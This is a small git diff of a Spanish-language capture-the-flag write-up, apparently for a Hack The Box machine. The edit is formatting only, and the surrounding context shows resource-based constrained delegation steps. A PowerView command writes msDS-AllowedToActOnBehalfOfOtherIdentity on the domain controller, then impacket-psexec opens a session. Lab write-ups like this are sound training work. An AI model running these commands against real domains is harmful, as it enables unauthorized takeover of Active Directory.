@@ -226,7 +226,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-Finalmente debemos settear este security descriptor en el campo msDS-AllowedToActOnBehalfOfOtherIdentity en el computador que queremos atacar, que en este caso es el DC, podemos hacer este paso importante ya que tenemos GenericAll ante este computador, si no tuvieramos este permiso no podriamos realizar el ataque:
+Finalmente debemos settear este security descriptor en el campo `msDS-AllowedToActOnBehalfOfOtherIdentity` en el computador que queremos atacar, que en este caso es el DC, podemos hacer este paso importante ya que tenemos GenericAll ante este computador, si no tuvieramos este permiso no podriamos realizar el ataque:
 
 ```
 Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
@@ -251,6 +251,7 @@ impacket-psexec -k dc.support.htb
 ```
 
 ![Pasted image 20250619195141](https://github.com/user-attachments/assets/f8861c24-6859-4bcb-8324-36930763de66)
+
 Y eso es todo!, gracias por leer:)
 
 ~x0tic
